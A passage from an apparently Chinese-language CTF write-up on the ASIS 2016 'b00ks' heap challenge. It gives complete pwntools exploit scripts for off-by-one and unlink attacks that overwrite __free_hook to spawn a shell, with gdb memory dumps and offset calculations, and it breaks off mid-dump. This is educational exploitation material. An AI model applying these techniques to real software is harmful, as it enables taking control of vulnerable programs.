class="line">    book2_des_addr = u64(book_des.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    io.success(<span class="string">"book2 name addr: 0x%x"</span> % book2_name_addr)</span><br><span class="line">    io.success(<span class="string">"book2 des addr: 0x%x"</span> % book2_des_addr)</span><br><span class="line">    libc_base = book2_des_addr - <span class="number">0x5a8010</span></span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    offset = <span class="number">0x45216</span> </span><br><span class="line">    offset = <span class="number">0x4526a</span> </span><br><span class="line">    <span class="comment">#offset = 0xf02a4 </span></span><br><span class="line">    <span class="comment">#offset = 0xf1147</span></span><br><span class="line">    one_gadget = libc_base + offset</span><br><span class="line">    io.success(<span class="string">"free_hook addr: 0x%x"</span> % free_hook)</span><br><span class="line">    io.success(<span class="string">"one_gadget addr: 0x%x"</span> % one_gadget)</span><br><span class="line">    payload = p64(free_hook)</span><br><span class="line">    edit(<span class="number">1</span>, payload)</span><br><span class="line">    edit(<span class="number">2</span>, p64(one_gadget))</span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><p>我只讲解exp函数内的内容，外面的那些只是为了方便堆块的申请，输出，删除什么的，堆题建议都写成函数，因为将会有大量重复动作</p><h5 id="填满author"><a href="#填满author" class="headerlink" title="填满author"></a>填满author</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io.sendlineafter(<span class="string">": "</span>, <span class="string">"author"</span>.rjust(<span class="number">0x20</span>,<span class="string">'a'</span>))</span><br></pre></td></tr></table></figure><p>具体查找author位置可以跟我一样，find 字符串</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb-peda$ find author</span><br><span class="line">Searching for 'author' in: None ranges</span><br><span class="line">Found <span class="number">8</span> results, display max <span class="number">8</span> items:</span><br><span class="line">b00ks_debug : <span class="number">0x555b3bcd83e1</span> (<span class="string">"author name"</span>)</span><br><span class="line">b00ks_debug : <span class="number">0x555b3bcd8401</span> (<span class="string">"author name: "</span>)</span><br><span class="line">b00ks_debug : <span class="number">0x555b3bcd841c</span> (<span class="string">"author_name"</span>)</span><br><span class="line">b00ks_debug : <span class="number">0x555b3bed83e1</span> (<span class="string">"author name"</span>)</span><br><span class="line">b00ks_debug : <span class="number">0x555b3bed8401</span> (<span class="string">"author name: "</span>)</span><br><span class="line">b00ks_debug : <span class="number">0x555b3bed841c</span> (<span class="string">"author_name"</span>)</span><br><span class="line">b00ks_debug : <span class="number">0x555b3bed905a</span> --&gt; <span class="number">0xa160726f68747561</span> </span><br><span class="line">    [<span class="built_in">stack</span>] : <span class="number">0x7ffed60b6406</span> (<span class="string">"author name: "</span>)</span><br></pre></td></tr></table></figure><p>这是创建一个堆块过后的效果，第三行便是book1结构体地址</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">20</span>gx <span class="number">0x555b3bed905a</span><span class="number">-0x2</span><span class="number">-0x18</span></span><br><span class="line"><span class="number">0x555b3bed9040</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x555b3bed9050</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x726f687475616161</span></span><br><span class="line"><span class="number">0x555b3bed9060</span>:	<span class="number">0x0000555b3bf8a160</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555b3bed9070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555b3bed9080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555b3bed9090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555b3bed90a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555b3bed90b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555b3bed90c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555b3bed90d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><h5 id="创建堆块1"><a href="#创建堆块1" class="headerlink" title="创建堆块1"></a>创建堆块1</h5><p>相信我，这里是这道题最难的地方，过了这个坎就很简单了，每个人环境不同，处理的结果也不一样，所以自行调试，在这里我能给你的建议就是将description申请大一点，泄露部分不需要这里大小控制，先不讲，你先调试到能泄露就行</p><h5 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h5><p>这个不多讲</p><h5 id="通过edit伪造book结构体"><a href="#通过edit伪造book结构体" class="headerlink" title="通过edit伪造book结构体"></a>通过edit伪造book结构体</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload =  <span class="string">'a'</span>*<span class="number">0xa0</span> + p64(<span class="number">1</span>) + p64(first_heap + <span class="number">0x38</span>) + p64(first_heap + <span class="number">0x40</span>) + p64(<span class="number">0xffff</span>)</span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br></pre></td></tr></table></figure><p>这前面的偏移是看个人环境的，网上的很多没有偏移，在我电脑环境上做不到，我通过这个偏移能刚好对齐，具体调试过程就是繁杂的了，总之，你要让你覆盖掉堆块1的地址那部分，刚好在book1的description指针指向的空间里，这样你才能自行伪造结构体<br>比如<br>我泄露出来的第一个堆块地址为这个[+] first_heap: 0x55b6b5d72160<br>那这时候我覆盖过后地址就变成[+] first_heap: 0x55b6b5d72100，你要让0x55b6b5d72100在description指向的空间内就成了，建议将description申请的大一些，这样容易做到，这部分跟创建堆块1是结合起来的，你看我创建的大小在你那不一定准确</p><h5 id="这时候再次利用off-by-one"><a href="#这时候再次利用off-by-one" class="headerlink" title="这时候再次利用off by one"></a>这时候再次利用off by one</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">author_name(<span class="string">"author"</span>.rjust(<span class="number">0x20</span>,<span class="string">'a'</span>))</span><br></pre></td></tr></table></figure><p>将地址最低位覆盖成\x00,这样我们我们的那个堆块1的指针就指向了我们自己伪造的结构体了，这个结构体description和name我们指向了book2结构体，这样我们通过编辑堆块1的description就能改掉book2的结构体的description指针和name指针，我们能编辑book2的description，相当于任意写了</p><h5 id="这里部分就只是泄露了"><a href="#这里部分就只是泄露了" class="headerlink" title="这里部分就只是泄露了"></a>这里部分就只是泄露了</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">book_id_1, book_name, book_des, book_author = printbook(<span class="number">1</span>)</span><br><span class="line">book2_name_addr = u64(book_name.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">book2_des_addr = u64(book_des.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">io.success(<span class="string">"book2 name addr: 0x%x"</span> % book2_name_addr)</span><br><span class="line">io.success(<span class="string">"book2 des addr: 0x%x"</span> % book2_des_addr)</span><br><span class="line">libc_base = book2_des_addr - <span class="number">0x5a8010</span></span><br><span class="line">io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">offset = <span class="number">0x45216</span> </span><br><span class="line">offset = <span class="number">0x4526a</span> </span><br><span class="line"><span class="comment">#offset = 0xf02a4 </span></span><br><span class="line"><span class="comment">#offset = 0xf1147</span></span><br><span class="line">one_gadget = libc_base + offset</span><br><span class="line">io.success(<span class="string">"free_hook addr: 0x%x"</span> % free_hook)</span><br><span class="line">io.success(<span class="string">"one_gadget addr: 0x%x"</span> % one_gadget)</span><br></pre></td></tr></table></figure><p>这里那个固定偏移，第一部分libc_base我是通过vmmap获得libc基地址，然后我调试的时候减一下就获得这个固定偏移了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb-peda$ vmmap</span><br><span class="line">Start              End                Perm	Name</span><br><span class="line"><span class="number">0x0000564350ee5000</span> <span class="number">0x0000564350ee7000</span> r-xp	/tmp/pwn/b00ks_debug</span><br><span class="line"><span class="number">0x00005643510e6000</span> <span class="number">0x00005643510e7000</span> r--p	/tmp/pwn/b00ks_debug</span><br><span class="line"><span class="number">0x00005643510e7000</span> <span class="number">0x00005643510e8000</span> rw-p	/tmp/pwn/b00ks_debug</span><br><span class="line"><span class="number">0x0000564351cdd000</span> <span class="number">0x0000564351cff000</span> rw-p	[heap]</span><br><span class="line"><span class="number">0x00007f2805862000</span> <span class="number">0x00007f2805a22000</span> r-xp	/home/NoOne-hub/Desktop/heap/off_by_one/Asis_2016_b00ks/libc.so<span class="number">.6</span></span><br><span class="line"><span class="number">0x00007f2805a22000</span> <span class="number">0x00007f2805c22000</span> ---p	/home/NoOne-hub/Desktop/heap/off_by_one/Asis_2016_b00ks/libc.so<span class="number">.6</span></span><br><span class="line"><span class="number">0x00007f2805c22000</span> <span class="number">0x00007f2805c26000</span> r--p	/home/NoOne-hub/Desktop/heap/off_by_one/Asis_2016_b00ks/libc.so<span class="number">.6</span></span><br><span class="line"><span class="number">0x00007f2805c26000</span> <span class="number">0x00007f2805c28000</span> rw-p	/home/NoOne-hub/Desktop/heap/off_by_one/Asis_2016_b00ks/libc.so<span class="number">.6</span></span><br><span class="line"><span class="number">0x00007f2805c28000</span> <span class="number">0x00007f2805c2c000</span> rw-p	mapped</span><br><span class="line"><span class="number">0x00007f2805c2c000</span> <span class="number">0x00007f2805c52000</span> r-xp	/tmp/ld.so<span class="number">.2</span></span><br><span class="line"><span class="number">0x00007f2805e0a000</span> <span class="number">0x00007f2805e51000</span> rw-p	mapped</span><br><span class="line"><span class="number">0x00007f2805e51000</span> <span class="number">0x00007f2805e52000</span> r--p	/tmp/ld.so<span class="number">.2</span></span><br><span class="line"><span class="number">0x00007f2805e52000</span> <span class="number">0x00007f2805e53000</span> rw-p	/tmp/ld.so<span class="number">.2</span></span><br><span class="line"><span class="number">0x00007f2805e53000</span> <span class="number">0x00007f2805e54000</span> rw-p	mapped</span><br><span class="line"><span class="number">0x00007ffd06df4000</span> <span class="number">0x00007ffd06e15000</span> rw-p	[<span class="built_in">stack</span>]</span><br><span class="line"><span class="number">0x00007ffd06edc000</span> <span class="number">0x00007ffd06edf000</span> r--p	[vvar]</span><br><span class="line"><span class="number">0x00007ffd06edf000</span> <span class="number">0x00007ffd06ee1000</span> r-xp	[vdso]</span><br></pre></td></tr></table></figure><p>在heap下面权限为r-xp的start部分的地址就是libc基地址了，<br>然后任选一个泄露的<br>[+] book2 name addr: 0x7f2805e2c010<br>[+] book2 des addr: 0x7f2805e0a010<br>我选了description部分的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">└──╼ $python</span><br><span class="line">Python <span class="number">2.7</span><span class="number">.16</span> (<span class="keyword">default</span>, Apr  <span class="number">6</span> <span class="number">2019</span>, <span class="number">01</span>:<span class="number">42</span>:<span class="number">57</span>) </span><br><span class="line">[GCC <span class="number">8.3</span><span class="number">.0</span>] on linux2</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> <span class="keyword">or</span> <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; hex(<span class="number">0x7f2805e0a010</span><span class="number">-0x00007f2805862000</span>)</span><br><span class="line">'0x5a8010'</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>就是这个固定偏移了</p><p>至于libc跟one_gadget偏移，用工具吧one_gadget</p><h5 id="最后任意地址写"><a href="#最后任意地址写" class="headerlink" title="最后任意地址写"></a>最后任意地址写</h5><ol><li>先编辑book1的description改成free_hook地址，就是将book2的description指针指向free_hook</li><li>编辑book2的description，就是写入one_gadget了</li><li>最后在调用一次free就可以getshell了<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(free_hook)</span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br><span class="line">edit(<span class="number">2</span>, p64(one_gadget))</span><br><span class="line">remove(<span class="number">2</span>)</span><br></pre></td></tr></table></figure></li></ol><h4 id="unlink原理"><a href="#unlink原理" class="headerlink" title="unlink原理"></a>unlink原理</h4><p>void unlink(malloc_chunk *P, malloc_chunk *BK, malloc_chunk *FD)</p><p>{</p><pre><code>FD = P-&gt;fd;

BK = P-&gt;bk;

FD-&gt;bk = BK;

BK-&gt;fd = FD;</code></pre><p>}<br><span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5naXRodWIuaW8vY3RmLXdpa2kvcHduL2xpbnV4L2dsaWJjLWhlYXAvdW5saW5rLXpoLw==" title="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/">ctf-wiki讲解原理<i class="fa fa-external-link"></i></span><br>我觉得那张图配的十分好，就是双向链表的解链过程，好好理解，不理解没法搞下去</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> pre_size;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">char</span> *fd; <span class="comment">//前驱指针 forward</span></span><br><span class="line">    <span class="keyword">char</span> *bk; <span class="comment">// 后继指针 back</span></span><br><span class="line">    数据部分</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大概就是这样，我创建三个这个结构体，a,b,c连接部分如下图，<br>链表： a&lt;-&gt;b&lt;-&gt;c<br>将b从链表中解链就是unlink<br>过程：</p><ol><li>FD = b-&gt;fd; //实际就是FD=a</li><li>BK = b-&gt;bk; //实际就是BK=c</li><li>FD-&gt;bk = BK; //就是从a-&gt;b变成a-&gt;c</li><li>BK-&gt;fd = FD; //就是从c-&gt;b变成c-&gt;a</li></ol><p>那unlink为什么能利用，进行攻击呢？我也纠结了这个很久，从ctf-wiki上了解的过去的unlink就不讲了，那时候的攻击方式比较简单，我只讲现今的unlink攻击方式<br>我们可以通过伪造chunk，让他解链的时候unlink一个我们伪造的chunk，这样的话，我们实际就达到了一个赋值的效果，而具体的效果从例子中讲解吧</p><h5 id="unlink攻击过程"><a href="#unlink攻击过程" class="headerlink" title="unlink攻击过程"></a>unlink攻击过程</h5><ol><li>利用off-by-one覆盖掉结果的null字节，泄露第一个堆块的地址</li><li>泄露掉后利用unlink，使得堆块4的mem部分的指针指向ptr-0x18处，ptr-0x18为自定义的地址，其实就是堆块4，就是create出来的那个堆块</li><li>覆盖堆块4的内容，修改了堆块4的description的指针，指向了堆块6的description部分的指针</li><li>其实第三部分就相当于获得了一个任意地址读写的指针</li><li>这里有好几次修改容易绕晕，我绕了两天才绕出来，第一次修改的时候是将chunk4整体改写，从开头到description指针，全部改掉，将chunk4的description指向chunk6结构体的description</li><li>然后第二次编辑的时候就是编辑chunk6结构体的description，这样就可以修改chunk6的description指针指向任意地点</li><li>利用这个特性输出，输出了libc的地址，具体libc在哪个位置可以通过调试得到</li><li>利用这个特性任意地址写<br>先对整体过程有个大概的了解，在一步步讲</li></ol><h5 id="过程中的坑"><a href="#过程中的坑" class="headerlink" title="过程中的坑"></a>过程中的坑</h5><ol><li>开头remove两次是有原因的，这样会让堆块6的结构体在前面几个堆块内，因为堆块同样大小的在free过后在malloc后会再次利用，这样方便我们自己调试查看以及利用</li><li>调试时候的计算问题，可以用你当时调试出来的减去后两位数字，获得个heap_base这样直接利用heap_base + 偏移比较快计算结果</li><li>当申请不是16的整数倍的时候，他会转换成16的整数倍，比如我exp中的0x108，实际大小会变成111，还有个1是标记的，他会将下一个chunk的pre_size拿来使用，因为没有free的话，pre_size是没用的，为了不浪费空间，就使用了</li></ol><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">elf = context.binary = ELF(<span class="string">'b00ks'</span>)</span><br><span class="line"></span><br><span class="line">LIBC = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">host = args.HOST <span class="keyword">or</span> <span class="string">'127.0.0.1'</span></span><br><span class="line">port = int(args.PORT <span class="keyword">or</span> <span class="number">1080</span>)</span><br><span class="line">ctx.binary = <span class="string">'b00ks'</span></span><br><span class="line">ctx.remote_libc = LIBC</span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line"><span class="keyword">if</span> ctx.debug_remote_libc == <span class="literal">False</span>:</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ctx.remote_libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    io.sendline(str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(book_size, book_name, desc_size, desc)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(book_size))</span><br><span class="line">    io.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    <span class="keyword">if</span> len(book_name) == book_size:<span class="comment">#deal with overflow</span></span><br><span class="line">        io.send(book_name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.sendline(book_name)</span><br><span class="line">    io.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(str(desc_size))</span><br><span class="line">    <span class="keyword">if</span> len(desc) == desc_size:</span><br><span class="line">        io.send(desc)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.sendline(desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, desc)</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(desc))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printf</span><span class="params">()</span>:</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">author_name</span><span class="params">(name)</span>:</span></span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, <span class="string">"author"</span>.rjust(<span class="number">0x20</span>,<span class="string">'a'</span>))</span><br><span class="line">    create(<span class="number">0x20</span>, <span class="string">'11111'</span>, <span class="number">0x20</span>, <span class="string">'b'</span>) <span class="comment">#1</span></span><br><span class="line">    printf()</span><br><span class="line">    io.recvuntil(<span class="string">'Author: '</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"author"</span>)</span><br><span class="line">    first_heap = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    create(<span class="number">0x20</span>, <span class="string">"22222"</span>, <span class="number">0x20</span>, <span class="string">"desc buf"</span>) <span class="comment">#2</span></span><br><span class="line">    create(<span class="number">0x20</span>, <span class="string">"33333"</span>, <span class="number">0x20</span>, <span class="string">"desc buf"</span>) <span class="comment">#3</span></span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line">    remove(<span class="number">3</span>)</span><br><span class="line">    create(<span class="number">0x20</span>, <span class="string">"33333"</span>, <span class="number">0x108</span>, <span class="string">'overflow'</span>) <span class="comment">#4</span></span><br><span class="line">    create(<span class="number">0x20</span>, <span class="string">"44444"</span>, <span class="number">0x100</span><span class="number">-0x10</span>, <span class="string">'target'</span>) <span class="comment">#5</span></span><br><span class="line">    create(<span class="number">0x20</span>, <span class="string">"/bin/sh\x00"</span>, <span class="number">0x200</span>, <span class="string">'to arbitrary read and write'</span>) <span class="comment">#6</span></span><br><span class="line">    heap_base = first_heap - <span class="number">0x80</span></span><br><span class="line">    ptr = heap_base + <span class="number">0x180</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>) + <span class="string">'\x00'</span>*<span class="number">0xe0</span> + p64(<span class="number">0x100</span>)</span><br><span class="line">    edit(<span class="number">4</span>, payload)</span><br><span class="line">    remove(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0x30</span>) + p64(<span class="number">4</span>) + p64(first_heap+<span class="number">0x40</span>)*<span class="number">2</span></span><br><span class="line">    edit(<span class="number">4</span>, payload)</span><br><span class="line">    edit(<span class="number">4</span>, p64(heap_base + <span class="number">0x1e0</span>))</span><br><span class="line">    printf()</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        io.recvuntil(<span class="string">'Description: '</span>)</span><br><span class="line">    content = io.recvline()</span><br><span class="line">    io.info(content)</span><br><span class="line">    libc_base = u64(content.strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))<span class="number">-0x3c4b78</span></span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    io.success(<span class="string">'system: 0x%x'</span> % system_addr)</span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    payload = p64(free_hook) + p64(<span class="number">0x200</span>)</span><br><span class="line">    edit(<span class="number">4</span>, payload)</span><br><span class="line">    edit(<span class="number">6</span>, p64(system_addr))</span><br><span class="line">    io.success(<span class="string">'first_heap: 0x%x'</span> % first_heap)</span><br><span class="line">    remove(<span class="number">6</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><p>同样，我只讲解exp部分的内容，其余一样是准备工作</p><h5 id="填充并泄露堆块1地址"><a href="#填充并泄露堆块1地址" class="headerlink" title="填充并泄露堆块1地址"></a>填充并泄露堆块1地址</h5><p>一样的过程，利用off-by-one泄露地址，不讲了，只讲重点</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io.sendlineafter(<span class="string">": "</span>, <span class="string">"author"</span>.rjust(<span class="number">0x20</span>,<span class="string">'a'</span>))</span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">'11111'</span>, <span class="number">0x20</span>, <span class="string">'b'</span>) <span class="comment">#1</span></span><br><span class="line">printf()</span><br><span class="line">io.recvuntil(<span class="string">'Author: '</span>)</span><br><span class="line">io.recvuntil(<span class="string">"author"</span>)</span><br><span class="line">first_heap = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br></pre></td></tr></table></figure><h5 id="创建堆块并remove掉"><a href="#创建堆块并remove掉" class="headerlink" title="创建堆块并remove掉"></a>创建堆块并remove掉</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">create(<span class="number">0x20</span>, <span class="string">"22222"</span>, <span class="number">0x20</span>, <span class="string">"desc buf"</span>) <span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">"33333"</span>, <span class="number">0x20</span>, <span class="string">"desc buf"</span>) <span class="comment">#3</span></span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>这里是要将book6的结构体位置放到前面，方便利用，你可以自己去调试试试，不这样做的话，位置很难找，因为他定义的存储这个结构体的大小也是0x20+0x10(数据部分+结构部分)</p><h5 id="unlink部分-重点"><a href="#unlink部分-重点" class="headerlink" title="unlink部分(重点)"></a>unlink部分(重点)</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">create(<span class="number">0x20</span>, <span class="string">"33333"</span>, <span class="number">0x108</span>, <span class="string">'overflow'</span>) <span class="comment">#4</span></span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">"44444"</span>, <span class="number">0x100</span><span class="number">-0x10</span>, <span class="string">'target'</span>) <span class="comment">#5</span></span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">"/bin/sh\x00"</span>, <span class="number">0x200</span>, <span class="string">'to arbitrary read and write'</span>) <span class="comment">#6</span></span><br><span class="line">heap_base = first_heap - <span class="number">0x80</span></span><br><span class="line">ptr = heap_base + <span class="number">0x180</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>) + <span class="string">'\x00'</span>*<span class="number">0xe0</span> + p64(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">4</span>, payload)</span><br><span class="line">remove(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><ol><li>创建两个smallchunk，因为unlink只有在smallbin下才可以，fastbin不行</li><li>最后一个chunk是用来编辑的，以及free的，free的参数要带/bin/sh，就是要将他改写成system函数</li><li>heap_base = first_heap - 0x80这个偏移自己定，每次调试可能都不一样，反正只要对的上你自己调试的时候就行，方便自己计算，我这里调试的时候是<br>[+] first_heap: 0x56182d174080所以减了0x80</li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">50</span>gx <span class="number">0x5653ee7a5080</span></span><br><span class="line"><span class="number">0x5653ee7a5080</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x00005653ee7a5020</span></span><br><span class="line"><span class="number">0x5653ee7a5090</span>:	<span class="number">0x00005653ee7a5050</span>	<span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x5653ee7a50a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5653ee7a50b0</span>:	<span class="number">0x0000000000000006</span>	<span class="number">0x00005653ee7a50e0</span></span><br><span class="line"><span class="number">0x5653ee7a50c0</span>:	<span class="number">0x00005653ee7a53e0</span>	<span class="number">0x0000000000000200</span></span><br><span class="line"><span class="number">0x5653ee7a50d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5653ee7a50e0</span>:	<span class="number">0x0068732f6e69622f</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a50f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5653ee7a5110</span>:	<span class="number">0x0000565300000005</span>	<span class="number">0x00005653ee7a5140</span></span><br><span class="line"><span class="number">0x5653ee7a5120</span>:	<span class="number">0x00005653ee7a52e0</span>	<span class="number">0x00000000000000f0</span></span><br><span class="line"><span class="number">0x5653ee7a5130</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5653ee7a5140</span>:	<span class="number">0x0000003434343434</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5150</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5160</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5653ee7a5170</span>:	<span class="number">0x0000565300000004</span>	<span class="number">0x00005653ee7a51a0</span></span><br><span class="line"><span class="number">0x5653ee7a5180</span>:	<span class="number">0x00005653ee7a51d0</span>	<span class="number">0x0000000000000108</span></span><br><span class="line"><span class="number">0x5653ee7a5190</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5653ee7a51a0</span>:	<span class="number">0x0000003333333333</span>	<span class="number">0x00005653ee7a5140</span></span><br><span class="line"><span class="number">0x5653ee7a51b0</span>:	<span class="number">0x00005653ee7a5170</span>	<span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x5653ee7a51c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span> #chunk4</span><br><span class="line"><span class="number">0x5653ee7a51d0</span>:	<span 